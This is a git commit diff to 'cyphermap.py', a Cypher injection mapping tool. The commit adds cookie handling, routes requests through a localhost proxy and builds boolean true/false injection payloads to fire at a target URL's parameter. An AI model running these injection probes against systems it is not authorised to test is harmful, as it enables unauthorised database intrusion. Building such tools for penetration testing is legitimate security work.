2a6e37ec94eeeaa2311308dff252857a70f1f4b4
Michał Majchrowicz <sectroyer@gmail.com>
2023-04-26 22:13:09 +0200

    Fix cookie issue.
    Signed-off-by: Michał Majchrowicz <sectroyer@gmail.com>

--- cyphermap.py
+++ cyphermap.py
@@ -3,22 +3,24 @@
 import argparse
 import urllib.parse
 import requests
+import random
 import sys
 
 
-def perform_request(target_url, post_data=False, cookie_data={}, connection_timeout=5):
+def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
+    proxies={'http':'http://localhost:8080'}
     try:
         if post_data:
-            response = requests.post(target_url, data=post_data, cookies=cookie_data, timeout=connection_timeout)
+            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies)
         else:
-            response = requests.get(target_url, cookies=cookie_data, timeout=connection_timeout)
+            response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)
 
         return response.text
 
     except requests.exceptions.Timeout:
         return False
 
-def cypher_inject(target_url, payload, post_data=False, cookie_data={}, connection_timeout=5):
+def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
     # Check if '*' is in target_url
     if '*' in target_url:
         encoded_payload = urllib.parse.quote_plus(payload)
@@ -32,9 +34,9 @@ def cypher_inject(target_url, payload, post_data=False, cookie_data={}, connecti
             print("Error: no '*' found in target URL or post data")
             return None
     
-    return perform_request(target_url, post_data, cookie_data, connection_timeout)
+    return perform_request(target_url, post_data, cookies_dict, connection_timeout)
 
-def get_injection_type(target_url, payload, post_data, blind_string, connection_timeout):
+def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
     
     injection_character = "'" 
     
@@ -46,11 +48,11 @@ def get_injection_type(target_url, payload, post_data, blind_string, connection_
     true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
     false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)
 
-
+    true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
     # Try to inject the payloads using single quotes in target_url and post_data
     try:
-        true_result = cypher_inject(target_url, true_payload, post_data, cookie_data, connection_timeout)
-        false_result = cypher_inject(target_url, false_payload, post_data, cookie_data, connection_timeout)
+        true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
+        false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
     except:
         print("Unable to perform cypher injection")
         return False
@@ -60,6 +62,17 @@ def get_injection_type(target_url, payload, post_data, blind_string, connection_
         return injection_character
     else:
         return False
+
+def generate_cookies_dictionary(cookie_string):
+    cookie_dict = {}
+    if cookie_string:
+        cookies = cookie_string.split(';')
+        for cookie in cookies:
+            name_value = cookie.strip().split('=', 1)
+            if len(name_value) == 2:
+                cookie_dict[name_value[0]] = name_value[1]
+    return cookie_dict
+
 
 print('\nCypher Mapping Tool by sectroyer v0.1\n')
 
@@ -74,9 +87,11 @@ try:
 
     target_url = args.url
     post_data = args.data
-    request_cookie = args.cookie
+    cookies_string = args.cookie
     blind_string = args.string
     connection_timeout = args.timeout
+
+    cookies_dict=generate_cookies_dictionary(cookies_string)
 
     if "*" not in target_url and (not post_data or "*" not in post_data):
         print("Error: No '*' provided in url or data. Unable to continue...")
@@ -84,8 +99,11 @@ try:
     if target_url.count('*') > 1 or post_data.count('*') > 1:
         print("More than one '*' provided in url or data. Unable to continue...")
         sys.exit(-1)
+    
+    injection_type=get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
+    print("Injection type: "+injection_type)
 
-except:
+except SystemExit:
     print('')
     sys.exit()
 
